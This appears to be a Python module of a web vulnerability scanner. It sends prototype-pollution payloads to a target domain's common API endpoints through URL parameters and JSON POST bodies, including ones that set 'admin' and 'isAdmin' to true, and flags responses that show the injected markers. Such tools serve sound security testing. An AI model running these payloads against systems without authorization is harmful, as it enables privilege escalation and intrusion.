"""
Trace Foundry V8.5 - Prototype Pollution Scanner
Injects __proto__, constructor.prototype via URL params & JSON body
Anti-FP: Triple-confirm via structural response diff
"""
import urllib.request, urllib.error, urllib.parse, json, re
from utils.display import section, ok, info, warn, bug_found
from core.antifp_engines import get_diff_engine, get_waf_interceptor

PROTO_PAYLOADS = [
    # URL param style
    ("__proto__[tf_test]",    "tf_polluted"),
    ("__proto__[status]",     "999"),
    ("constructor[prototype][tf_test]", "tf_polluted"),
    ("__proto__.tf_test",     "tf_polluted"),
    # JSON body style
    ('{"__proto__":{"tf_test":"tf_polluted"}}',           "json"),
    ('{"constructor":{"prototype":{"tf_test":"tf_polluted"}}}', "json"),
    ('{"__proto__":{"admin":true}}',                      "json"),
    ('{"__proto__":{"isAdmin":true}}',                    "json"),
    ('{"__proto__":{"debug":true}}',                      "json"),
]

ENDPOINTS = ["/","/api","/api/v1","/search","/api/search",
             "/api/v1/search","/user","/api/user","/profile",
             "/api/merge","/api/extend","/api/clone","/api/copy",
             "/api/update","/api/patch","/api/assign"]

INDICATORS = [
    "tf_polluted","\"tf_test\"","tf_test:",
    "\"admin\":true","\"isAdmin\":true","\"debug\":true",
    "\"status\":999",
]

class ProtoPollutionModule:
    def __init__(self, domain, timeout=6):
        self.domain  = domain
        self.timeout = timeout
        self.diff    = get_diff_engine()
        self.waf     = get_waf_interceptor()
        self.headers = {"User-Agent":"Mozilla/5.0","Accept":"application/json,*/*"}

    def _fetch(self, url, method="GET", data=None, extra_headers=None):
        h = {**self.headers, **(extra_headers or {})}
        try:
            req = urllib.request.Request(url, data=data, headers=h, method=method)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(32768).decode("utf-8", errors="ignore")
                return body, r.status, dict(r.headers)
        except urllib.error.HTTPError as e:
            try:    body = e.read(16384).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code, dict(e.headers)
        except: return "", 0, {}

    def _check_pollution(self, body, base_body):
        """Anti-FP: indicator must appear in attack but NOT in baseline."""
        for ind in INDICATORS:
            if ind in body and ind not in base_body:
                return True, ind
        # Check JSON keys
        try:
            data = json.loads(body)
            base = json.loads(base_body) if base_body else {}
            added, _ = self.diff.json_key_diff(base_body, body)
            for key in added:
                if "tf_test" in key or "tf_polluted" in key:
                    return True, f"new key: {key}"
        except: pass
        return False, None

    def run(self):
        section("Prototype Pollution Scanner (URL Params + JSON Body)")
        all_bugs = []

        for ep in ENDPOINTS:
            for scheme in ["https","http"]:
                base_url = f"{scheme}://{self.domain}{ep}"
                base_body, base_status, base_headers = self._fetch(base_url)
                if base_status == 0: continue
                if self.waf.should_skip(base_status, base_body, base_headers): break

                info(f"Testing proto pollution: {base_url}")

                for payload, mode in PROTO_PAYLOADS:
                    if mode == "json":
                        # POST JSON payload
                        data = payload.encode()
                        body, status, hdrs = self._fetch(
                            base_url, method="POST", data=data,
                            extra_headers={"Content-Type":"application/json"})
                    else:
                        # GET param
                        url = f"{base_url}?{payload}"
                        body, status, hdrs = self._fetch(url)

                    if not body: continue
                    if self.waf.should_skip(status, body, hdrs): continue

                    confirmed, indicator = self._check_pollution(body, base_body)
                    if confirmed:
                        test_url = base_url if mode=="json" else f"{base_url}?{payload}"
                        all_bugs.append({
                            "type":     "Prototype Pollution",
                            "severity": "HIGH",
                            "url":      test_url,
                            "payload":  payload[:80],
                            "mode":     mode,
                            "evidence": f"Indicator found: {indicator}",
                            "detail":   "Attacker can pollute Object.prototype — may lead to RCE or auth bypass",
                            "impact":   "Property injection into all objects — potential privilege escalation",
                        })
                        bug_found("PROTOTYPE POLLUTION", "HIGH", {
                            "URL":      test_url,
                            "Payload":  payload[:60],
                            "Mode":     mode,
                            "Evidence": indicator,
                            "Impact":   "Object.prototype polluted — auth bypass / RCE risk",
                        })
                        break
                break

        info(f"Proto pollution done — {len(all_bugs)} confirmed")
        if not all_bugs: ok("No prototype pollution found ✓")
        return {"bugs": all_bugs}
